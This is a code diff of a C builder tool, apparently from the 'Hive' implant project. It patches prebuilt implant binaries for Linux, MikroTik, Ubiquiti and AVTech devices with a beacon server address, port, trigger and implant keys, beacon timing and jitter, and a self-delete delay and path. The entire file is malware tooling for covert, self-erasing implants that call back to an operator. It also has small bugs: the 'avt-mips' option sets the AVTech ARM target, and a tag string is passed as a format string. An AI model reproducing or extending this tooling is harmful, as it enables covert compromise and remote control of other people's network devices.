@@ -12,15 +12,13 @@
 #include <time.h>
 #include "trigger_protocols.h"
 
-#include "_unpatched_solaris_sparc.h"
-#include "_unpatched_solaris_x86.h"
+//#include "_unpatched_solaris_x86.h"
 #include "_unpatched_linux_x86.h"
 #include "_unpatched_mikrotik_x86.h"
 #include "_unpatched_mikrotik_mips.h"
-#include "_unpatched_mikrotik_mipsel.h"
 #include "_unpatched_mikrotik_ppc.h"
 #include "_unpatched_ubiquiti_mips.h"
-
+#include "_unpatched_avtech_arm.h"
 #include "debug.h"
 #include "string_utils.h"
 #include "colors.h"
@@ -29,67 +27,82 @@
 #include "polarssl/config.h"
 #include "polarssl/sha1.h"
 
-#define HIVE_SOLARIS_SPARC_FILE "hived-solaris-sparc-PATCHED"
-#define HIVE_SOLARIS_X86_FILE "hived-solaris-x86-PATCHED"
-#define HIVE_LINUX_X86_FILE "hived-linux-x86-PATCHED"
-#define HIVE_MIKROTIK_X86_FILE "hived-mikrotik-x86-PATCHED"
-#define HIVE_MIKROTIK_MIPS_FILE "hived-mikrotik-mips-PATCHED"
-#define HIVE_MIKROTIK_MIPSEL_FILE "hived-mikrotik-mipsel-PATCHED"
-#define HIVE_MIKROTIK_PPC_FILE "hived-mikrotik-ppc-PATCHED"
-#define HIVE_UBIQUITI_MIPS_FILE "hived-ubiquiti-mips-PATCHED"
+//#define HIVE_SOLARIS_X86_FILE				"hived-solaris-x86-PATCHED"
+#define HIVE_LINUX_X86_FILE					"hived-linux-x86-PATCHED"
+#define HIVE_MIKROTIK_X86_FILE				"hived-mikrotik-x86-PATCHED"
+#define HIVE_MIKROTIK_MIPS_FILE				"hived-mikrotik-mips-PATCHED"
+//#define HIVE_MIKROTIK_MIPSEL_FILE			"hived-mikrotik-mipsel-PATCHED"
+#define HIVE_MIKROTIK_PPC_FILE				"hived-mikrotik-ppc-PATCHED"
+#define HIVE_UBIQUITI_MIPS_FILE				"hived-ubiquiti-mips-PATCHED"
+#define HIVE_AVTECH_ARM_FILE				"hived-avtech-arm-PATCHED"
 
-#define HIVE_SOLARIS_SPARC_UNPATCHED "hived-solaris-sparc-UNpatched"
-#define HIVE_SOLARIS_X86_UNPATCHED "hived-solaris-x86-UNpatched"
-#define HIVE_LINUX_X86_UNPATCHED "hived-linux-x86-UNpatched"
-#define HIVE_MIKROTIK_X86_UNPATCHED "hived-mikrotik-x86-UNpatched"
-#define HIVE_MIKROTIK_MIPS_UNPATCHED "hived-mikrotik-mips-UNpatched"
-#define HIVE_MIKROTIK_MIPSEL_UNPATCHED "hived-mikrotik-mipsel-UNpatched"
-#define HIVE_MIKROTIK_PPC_UNPATCHED "hived-mikrotik-ppc-UNpatched"
-#define HIVE_UBIQUITI_MIPS_UNPATCHED "hived-ubiquiti-mips-UNpatched"
+//#define HIVE_SOLARIS_X86_UNPATCHED 		"hived-solaris-x86-UNpatched"
+#define HIVE_LINUX_X86_UNPATCHED			"hived-linux-x86-UNpatched"
+#define HIVE_MIKROTIK_X86_UNPATCHED			"hived-mikrotik-x86-UNpatched"
+#define HIVE_MIKROTIK_MIPS_UNPATCHED		"hived-mikrotik-mips-UNpatched"
+//#define HIVE_MIKROTIK_MIPSEL_UNPATCHED	"hived-mikrotik-mipsel-UNpatched"
+#define HIVE_MIKROTIK_PPC_UNPATCHED			"hived-mikrotik-ppc-UNpatched"
+#define HIVE_UBIQUITI_MIPS_UNPATCHED		"hived-ubiquiti-mips-UNpatched"
+#define HIVE_AVTECH_ARM_UNPATCHED			"hived-avtech-arm-UNpatched"
 
-#define ID_KEY_FILE	"ID-keys.txt"
+#define ID_KEY_FILE				"ID-keys.txt"
 #define ID_KEY_DATETIME_FORMAT	"%4i/%02i/%02i %02i:%02i:%02i"
+#define	SD_PATH_LENGTH			128		// This is also defined in server/self_delete.h
 
 #define CREAT_MODE	S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH
 
 #define OPTMATCH(o, s) ( strlen((o))==strlen((s)) && (strcmp((o),(s))== 0) )
 
 //********************************************************************************
-//rsa_context           rsa;
-struct cl_args {
-	unsigned int sig;
-	unsigned int beacon_port;
-	unsigned int host_len;
-	char beacon_ip[256];
-	char iface[16];
-	unsigned char idKey[ID_KEY_HASH_SIZE];
-	unsigned long init_delay;
-	unsigned int interval;
-	unsigned int trigger_delay;
-	unsigned int jitter;
-	time_t delete_delay;
-	unsigned int patched;
-} __attribute__ ((packed));
 
-#define SIG_HEAD    0x7AD8CFB6
-
-struct cl_args args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };
-
-#define DEFAULT_INITIAL_DELAY		3 * 60 * 1000	// 3 minutes
-#define DEFAULT_BEACON_PORT		443	// TCP port 443 (HTTPS)
-#define DEFAULT_BEACON_INTERVAL		0	// operators did not want a default value
-#define DEFAULT_TRIGGER_DELAY		60 * 1000	// 60 seconds
-#define DEFAULT_BEACON_JITTER		3	// Default value is 3, range is from 0<=jitter<=30
+#define SIG_HEAD    				0x7AD8CFB6
+#define DEFAULT_INITIAL_DELAY		3 * 60 * 1000		// 3 minutes
+#define DEFAULT_BEACON_PORT			443					// TCP port 443 (HTTPS)
+#define DEFAULT_BEACON_INTERVAL		0					// operators did not want a default value
+#define DEFAULT_TRIGGER_DELAY		60 * 1000			// 60 seconds
+#define DEFAULT_BEACON_JITTER		3					// Default value is 3, range is from 0<=jitter<=30
 #define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60	// Default value is 60 days...
 
+struct cl_args {
+	unsigned int 	sig;
+	unsigned int 	beacon_port;
+	unsigned int 	host_len;
+	char 			beacon_ip[256];
+	char			iface[16];
+	unsigned char	idKey[ID_KEY_HASH_SIZE];
+	unsigned long	init_delay;
+	unsigned int	interval;
+	unsigned int	trigger_delay;
+	unsigned int	jitter;
+	time_t			delete_delay;
+	char			sdpath[SD_PATH_LENGTH];
+	unsigned int	patched;
+} __attribute__ ((packed));
+
+struct cl_args args = {
+		SIG_HEAD,
+		DEFAULT_BEACON_PORT,
+		0,
+		{0},
+		{0},
+		{0},
+		DEFAULT_INITIAL_DELAY,
+		DEFAULT_BEACON_INTERVAL,
+		DEFAULT_TRIGGER_DELAY,
+		DEFAULT_BEACON_JITTER,
+		DEFAULT_SELF_DELETE_DELAY,
+		"/var",
+		1
+};
+
+typedef enum {FALSE=0, TRUE} boolean;
+
 //define displaySha1Hash function
-void printSha1Hash(FILE *file, char *label, unsigned char *sha1Hash)
+void printSha1Hash(FILE *file, char *tag, unsigned char *sha1Hash)
 {
 	int i = 0;
 
-	//Display Label
-	fprintf(file, "%s", label);
-
+	fprintf(file, tag);
 	//Display 40 hexadecimal number array
 	for (i = 0; i < ID_KEY_HASH_SIZE; i++)
 		fprintf(file, "%02x", sha1Hash[i]);
@@ -113,7 +126,8 @@ int usage(char **argv)
 	fprintf(stdout, "    %s-K <idKeyFile>%s     - ID key filename (maximum 100 character path)\n", GREEN, RESET);
 	fprintf(stdout, "    %s-k <ID Key Phrase>%s - ID key phrase (maximum 100 character string)\n", GREEN, RESET);
 	fprintf(stdout, "    %s-j <b_jitter>%s      - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN, RESET);
-	fprintf(stdout, "    %s-I <interface>%s     - Solaris Only - interface to listen for triggers\n", GREEN, RESET);
+//	fprintf(stdout, "    %s-I <interface>%s     - Solaris Only - interface to listen for triggers\n", GREEN, RESET);
+	fprintf(stdout, "    %s-P <file path>%s     - (optional) self-delete control/log file directory path [default: /var]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-p <port>%s          - (optional) beacon port [default: 443]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-s <sd_delay>%s      - (optional) self delete delay since last successful trigger/beacon (in seconds) [default: 60 days]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-t <t_delay>%s       - (optional) delay between trigger received & callback +/- 30 sec (in seconds) [default: 60 sec]\n", GREEN, RESET);
@@ -121,13 +135,13 @@ int usage(char **argv)
 	fprintf(stdout, "                             * 'all' - default\n");
 	fprintf(stdout, "                             * 'raw' - all unpatched\n");
 	fprintf(stdout, "                             * 'mt-x86'\n");
-	fprintf(stdout, "                             * 'mt-mips' (or 'mt-mipsbe' (deprecated) )\n");
-	fprintf(stdout, "                             * 'mt-mipsel' (or 'mt-mipsle' (deprecated) )\n");
+	fprintf(stdout, "                             * 'mt-mips'\n");
+//	fprintf(stdout, "                             * 'mt-mipsel' (or 'mt-mipsle' (deprecated) )\n");
 	fprintf(stdout, "                             * 'mt-ppc'\n");
 	fprintf(stdout, "                             * 'linux-x86'\n");
-	fprintf(stdout, "                             * 'sol-x86'\n");
-	fprintf(stdout, "                             * 'sol-sparc'\n");
+//	fprintf(stdout, "                             * 'sol-x86'\n");
 	fprintf(stdout, "                             * 'ub-mips'\n");
+	fprintf(stdout, "                             * 'avt-arm'\n");
 	fprintf(stdout, "    %s[-h ]%s              - print this usage\n\n", GREEN, RESET);
 //   fprintf(stdout, "  %sExamples:%s\n", BLUE, RESET);
 //   fprintf( stdout, "   Coming soon!\n\n" );
@@ -158,13 +172,13 @@ int main(int argc, char **argv)
 {
 	int optval;
 	int linux_x86 = 0;							// Linux x86
-	int solaris_sparc = 0;						// Solaris SPARC
-	int solaris_x86 = 0;						// Solaris x86
+//	int solaris_x86 = 0;						// Solaris x86
 	int mikrotik_x86 = 0;						// MikroTik x86
 	int mikrotik_mips = 0;						// MikroTik MIPS Big Endian
-	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
+//	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
 	int mikrotik_ppc = 0;						// MikroTik PowerPC [Big Endian]
 	int ubiquiti_mips = 0;						// Ubiquiti MIPS Big Endian
+	int avtech_arm = 0;							// AVTech ARM
 	int raw = 0;								// unpatched versions
 	char *host = (char *) NULL;					// cached hostname for user confirmation message
 	FILE *implantIDFile;						// Used to save implant keys and subsequent sha1 hashes...
@@ -172,20 +186,13 @@ int main(int argc, char **argv)
 	struct tm *idKeyTime;						// Pointer to the ID key generation data structure
 	unsigned char implantKey[ID_KEY_HASH_SIZE];
 	unsigned char triggerKey[ID_KEY_HASH_SIZE];
-	enum {FALSE=0, TRUE} keyed = FALSE;			// Boolean to verify that a key was entered
+	boolean keyed = FALSE;						// Boolean to verify that a key was entered
+
+	args.sig = SIG_HEAD;
 
 	implantKey[0] = '\0';
 
-	args.patched = 1;
-	args.init_delay = DEFAULT_INITIAL_DELAY;
-	args.beacon_port = DEFAULT_BEACON_PORT;
-	args.interval = DEFAULT_BEACON_INTERVAL;
-	args.trigger_delay = DEFAULT_TRIGGER_DELAY;
-	args.delete_delay = DEFAULT_SELF_DELETE_DELAY;
-	args.jitter = DEFAULT_BEACON_JITTER;
-	args.host_len = 0;
-
-	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:p:s:t:")) != -1) {
+	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:P:p:s:t:")) != -1) {
 		switch (optval) {
 
 		case 'a':	// Hostname / IP address of beacon LP
@@ -222,6 +229,7 @@ int main(int argc, char **argv)
 			usage(argv);
 			break;
 
+#if 0	// Solairis (deprecated)
 		case 'I':	// interface to listen for triggers. only needed for solaris
 			if (strlen(optarg) > sizeof(args.iface)) {
 				printf(" ERROR: Name of interface is too long\n");
@@ -231,6 +239,7 @@ int main(int argc, char **argv)
 			memcpy(args.iface, optarg, strlen(optarg));
 
 			break;
+#endif
 
 		case 'i':	// beacon interval
 			args.interval = (unsigned int) atoi(optarg) * 1000;
@@ -332,32 +341,42 @@ int main(int argc, char **argv)
 			keyed = TRUE;
 			break;
 
-		case 'm':	// operating system: valid linux, solaris, all, or raw
+		case 'm':	// operating system: valid Linux, all, or raw
 
 			do {
 				if (OPTMATCH(optarg, "mt-ppc"))		{mikrotik_ppc = 1;		break;}
 				if (OPTMATCH(optarg, "mt-mips"))	{mikrotik_mips = 1;		break;}
 				if (OPTMATCH(optarg, "mt-mipsbe"))	{mikrotik_mips = 1;		break;}
 				if (OPTMATCH(optarg, "mt-x86"))		{mikrotik_x86 = 1;		break;}
-				if (OPTMATCH(optarg, "sol-x86"))	{solaris_x86 = 1;		break;}
-				if (OPTMATCH(optarg, "sol-sparc"))	{solaris_sparc = 1;		break;}
+//				if (OPTMATCH(optarg, "sol-x86"))	{solaris_x86 = 1;		break;}
 				if (OPTMATCH(optarg, "linux-x86"))	{linux_x86 = 1;			break;}
-				if (OPTMATCH(optarg, "mt-mipsel"))	{mikrotik_mipsel = 1;	break;}
-				if (OPTMATCH(optarg, "mt-mipsle"))	{mikrotik_mipsel = 1;	break;}
+//				if (OPTMATCH(optarg, "mt-mipsel"))	{mikrotik_mipsel = 1;	break;}
+//				if (OPTMATCH(optarg, "mt-mipsle"))	{mikrotik_mipsel = 1;	break;}
 				if (OPTMATCH(optarg, "ub-mips"))	{ubiquiti_mips = 1;		break;}
+				if (OPTMATCH(optarg, "avt-mips"))	{avtech_arm = 1;		break;}
 				if (OPTMATCH(optarg, "raw"))		{raw = 1;				break;}
 
-				if (OPTMATCH(optarg, "all"))		{solaris_sparc = 1,
-													linux_x86 = 1,
-													solaris_x86 = 1,
+				if (OPTMATCH(optarg, "all"))		{linux_x86 = 1,
+//													solaris_x86 = 1,
 													mikrotik_x86 = 1,
 													mikrotik_mips = 1,
-													mikrotik_mipsel = 1,
+//													mikrotik_mipsel = 1,
 													mikrotik_ppc = 1,
-													ubiquiti_mips = 1;		break;}
+													ubiquiti_mips = 1;
+													avtech_arm = 1;
+																			break;}
 				printf(" ERROR: Invalid architecture specified\n");
 				return -1;
 			} while (0);
+			break;
+
+		case 'P':	// Set path for self-delete control and log files
+			if (strlen(optarg) + 9 < SD_PATH_LENGTH) {	// Make sure array is large enough for filename, '/' and '\0'
+				strcpy(args.sdpath, optarg);		// Copy the path from the command line
+			} else {
+				fprintf(stderr, "ERROR: Directory path is too long (maximum 120 characters)");
+				return -1;
+			}
 			break;
 
 		case 'p':	// beacon port
@@ -404,46 +423,56 @@ int main(int argc, char **argv)
 			return -1;
 		}
 
-		if (	(linux_x86 == 0) && (solaris_sparc == 0) && (solaris_x86 == 0) && (mikrotik_x86 == 0) &&
-				(mikrotik_mips == 0) && (mikrotik_ppc == 0) && (mikrotik_mipsel == 0) && (ubiquiti_mips == 0)) {	// no OS was selected, so default is to build all
-			solaris_sparc = 1;
-			linux_x86 = 1;
-			solaris_x86 = 1;
-			mikrotik_x86 = 1;
-			mikrotik_mips = 1;
-			mikrotik_mipsel = 1;
-			mikrotik_ppc = 1;
-			ubiquiti_mips = 1;
+		if (	(linux_x86 == 0) &&
+//				(solaris_x86 == 0) &&
+				(mikrotik_x86 == 0) &&
+				(mikrotik_mips == 0) && (mikrotik_ppc == 0) &&
+//				(mikrotik_mipsel == 0) &&
+				(ubiquiti_mips == 0) &&
+				(avtech_arm == 0)
+				) {	// no OS was selected, so default is to build all
+					linux_x86 = 1;
+//					solaris_x86 = 1;
+					mikrotik_x86 = 1;
+					mikrotik_mips = 1;
+//					mikrotik_mipsel = 1;
+					mikrotik_ppc = 1;
+					ubiquiti_mips = 1;
+					avtech_arm = 1;
 		}
 
-		if ((solaris_sparc == 1) || (solaris_x86 == 1)) {	// Solaris must have the interface patched in
+#if 0	// Solaris deprecated
+		if (solaris_x86 == 1) {	// Solaris must have the interface patched in
 			if (strlen(args.iface) == 0) {
 				printf("\n");
-				printf("    ERROR: Incomplete options. %sSolaris%s requires an interface be selected.\n", RED,
-				       RESET);
+				printf("    ERROR: Incomplete options. %sSolaris%s requires an interface be selected.\n", RED, RESET);
 				usage(argv);
 				return -1;
 			}
 		}
+#endif
 
 		printf("\n");
-		printf("  This application will generate PATCHED files with the following values:\n");
-		printf("   . Beacon Server IP address    -> %s\n", host);
-		printf("   . Beacon Server Port number   -> %d\n", args.beacon_port);
-		printSha1Hash(stdout, "   . Trigger Key                 -> ", triggerKey);
-		printf("\n");
-		printSha1Hash(stdout, "   . Implant Key                 -> ", implantKey);
-		printf("\n");
-		printf("   . Beacon Initial Delay        -> %lu (sec)\n", args.init_delay / 1000);
-		printf("   . Beacon Interval             -> %d (sec)\n", args.interval / 1000);
-		printf("   . Beacon Jitter               -> %d (percentage)\n", args.jitter);	//Added jitter display
-		printf("   . Self Delete Delay           -> %lu (sec)\n", args.delete_delay);
-		printf("   . Trigger Delay               -> %d +/- 30 (sec)\n", args.trigger_delay / 1000);
+		printf("  This application will generate PATCHED files with the following values:\n\n");
+		printf("\t%32s: %-s\n", "Beacon Server IP address", host);
+		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
+		printf("\t%32s: ", "Trigger Key");
+		printSha1Hash(stdout, "", triggerKey); printf("\n");
+		printf("\t%32s: ", "Implant Key");
+		printSha1Hash(stdout, "", implantKey); printf("\n");
+		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay / 1000);
+		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval / 1000);
+		printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
+		printf("\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
+		printf("\t%32s: %-s\n", "Self Delete Control File Path", args.sdpath);
+		printf("\t%32s: %-d\n", "Trigger Delay (+/-30 sec)", args.trigger_delay / 1000);
 	}
 
-	if (solaris_sparc == 1 || solaris_x86 == 1) {
+#if 0 // Solaris deprecated
+	if (solaris_x86 == 1) {
 		printf("   . Listening Interface         -> %s     (Solaris Only)\n", args.iface);
 	}
+#endif
 
 	printf("\n");
 	printf("  Target Operating Systems:\n");
@@ -454,21 +483,19 @@ int main(int argc, char **argv)
 		printf("   . Linux/x86\n");
 	}
 
-	if (solaris_sparc == 1 || raw == 1) {
-		printf("   . Solaris/SPARC\n");
-	}
-
+#if 0 // Solaris deprecated
 	if (solaris_x86 == 1 || raw == 1) {
 		printf("   . Solaris/x86\n");
 	}
+#endif
 
 	if (mikrotik_x86 == 1 || raw == 1) {
 		printf("   . MikroTik/x86\n");
 	}
 
-	if (mikrotik_mipsel == 1 || raw == 1) {
-		printf("   . MikroTik/MIPS (little endian)\n");
-	}
+//	if (mikrotik_mipsel == 1 || raw == 1) {
+//		printf("   . MikroTik/MIPS (little endian)\n");
+//	}
 	// beginning of big endian targets
 
 	if (mikrotik_mips == 1 || raw == 1) {
@@ -483,29 +510,33 @@ int main(int argc, char **argv)
 		printf("   . Ubiquiti/MIPS\n");
 	}
 
+	if (avtech_arm == 1 || raw == 1) {
+		printf("   . AVTech/ARM\n");
+	}
+
 	if (raw == 0) {
 		cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
 		cl_string((unsigned char *) args.iface, sizeof(args.iface));
+		cl_string((unsigned char *) args.sdpath, sizeof(args.sdpath));
 	}
 
-	remove(HIVE_SOLARIS_SPARC_FILE);
-	remove(HIVE_SOLARIS_X86_FILE);
+//	remove(HIVE_SOLARIS_X86_FILE);
 	remove(HIVE_LINUX_X86_FILE);
 	remove(HIVE_MIKROTIK_X86_FILE);
 	remove(HIVE_MIKROTIK_MIPS_FILE);
-	remove(HIVE_MIKROTIK_MIPSEL_FILE);
+//	remove(HIVE_MIKROTIK_MIPSEL_FILE);
 	remove(HIVE_MIKROTIK_PPC_FILE);
 	remove(HIVE_UBIQUITI_MIPS_FILE);
+	remove(HIVE_AVTECH_ARM_FILE);
 
-	remove(HIVE_SOLARIS_SPARC_UNPATCHED);
-	remove(HIVE_SOLARIS_X86_UNPATCHED);
+//	remove(HIVE_SOLARIS_X86_UNPATCHED);
 	remove(HIVE_LINUX_X86_UNPATCHED);
 	remove(HIVE_MIKROTIK_X86_UNPATCHED);
 	remove(HIVE_MIKROTIK_MIPS_UNPATCHED);
-	remove(HIVE_MIKROTIK_MIPSEL_UNPATCHED);
+//	remove(HIVE_MIKROTIK_MIPSEL_UNPATCHED);
 	remove(HIVE_MIKROTIK_PPC_UNPATCHED);
 	remove(HIVE_UBIQUITI_MIPS_UNPATCHED);
-
+	remove(HIVE_AVTECH_ARM_UNPATCHED);
 
 	sleep(1);
 
@@ -514,13 +545,13 @@ int main(int argc, char **argv)
 	if (raw == 1) {
 		printf("\n");
 		non_patch(HIVE_LINUX_X86_UNPATCHED, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len);
-		non_patch(HIVE_SOLARIS_SPARC_UNPATCHED, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len);
-		non_patch(HIVE_SOLARIS_X86_UNPATCHED, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len);
+//		non_patch(HIVE_SOLARIS_X86_UNPATCHED, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len);
 		non_patch(HIVE_MIKROTIK_X86_UNPATCHED, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len);
-		non_patch(HIVE_MIKROTIK_MIPSEL_UNPATCHED, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len);
+//		non_patch(HIVE_MIKROTIK_MIPSEL_UNPATCHED, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len);
 		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
 		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
 		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
+		non_patch(HIVE_AVTECH_ARM_UNPATCHED, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len);
 	}
 // We start as Little Endian.  If the binary is detected as Big Endian, then the structure
 // is changed to Big Endian.  Since these changes are made in a global variable used by all
@@ -530,17 +561,25 @@ int main(int argc, char **argv)
 		patch(HIVE_LINUX_X86_FILE, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len, args);
 	}
 
+#if 0	// Solaris no longer supported
 	if (solaris_x86 == 1) {
 		patch(HIVE_SOLARIS_X86_FILE, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len, args);
 	}
+#endif
 
 	if (mikrotik_x86 == 1) {
 		patch(HIVE_MIKROTIK_X86_FILE, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len, args);
 	}
 
+	if (avtech_arm == 1) {
+		patch(HIVE_AVTECH_ARM_FILE, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len, args);
+	}
+
+#if 0	// MikroTik little-endian no longer supported
 	if (mikrotik_mipsel == 1) {
 		patch(HIVE_MIKROTIK_MIPSEL_FILE, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len, args);
 	}
+#endif
 
 	if (mikrotik_ppc == 1) {
 		patch(HIVE_MIKROTIK_PPC_FILE, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len, args);
@@ -553,12 +592,8 @@ int main(int argc, char **argv)
 	if (ubiquiti_mips == 1) {
 		patch(HIVE_UBIQUITI_MIPS_FILE, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len, args);
 	}
-// beginning of big endian targets
-	if (solaris_sparc == 1) {
-		patch(HIVE_SOLARIS_SPARC_FILE, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len, args);
-	}
-
 	printf("\n");
+
 	return 0;
 }
 
@@ -594,20 +629,19 @@ int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct
 {
 	unsigned int sig_head = SIG_HEAD;
 	uint32_t sig_head2 = ntohl(SIG_HEAD);
-	unsigned char *p;	//, keybuffer[128];
+	unsigned char *p;
 	int fd, ret = 1;
 	unsigned int cnt = 0;
 	int big_endian = 0;
 	struct cl_args copy_of_args = patched_args;
 
-
-	printf("  \n");
-
 	p = hexarray;
 	cnt = 0;
+
+	printf("\n");
 	do {
 		if (cnt > arraylen) {
-			printf("\n  Patch signature not found in %s.  Aborting.\n\n", filename);
+			printf("\n\tPatch signature not found in %s. Aborting...\n\n", filename);
 			exit(0);
 			break;
 		}
@@ -628,8 +662,7 @@ int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct
 		cnt++;
 	} while (ret != 0);
 
-	p--;
-	printf("  SIG_HEAD found at offset %08x for %s\n", (int)(p - hexarray), filename);
+	printf("  SIG_HEAD found at offset 0x%x for %s\n", (int)(--p - hexarray), filename);
 
 //      memcpy( p + sizeof( SIG_HEAD ), keybuffer, 128 );
 	if (big_endian == 0) {
@@ -671,7 +704,7 @@ int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct
 
 	close(fd);
 
-	printf(" ok\n");
+	printf(" done\n");
 
 	return 0;
 }
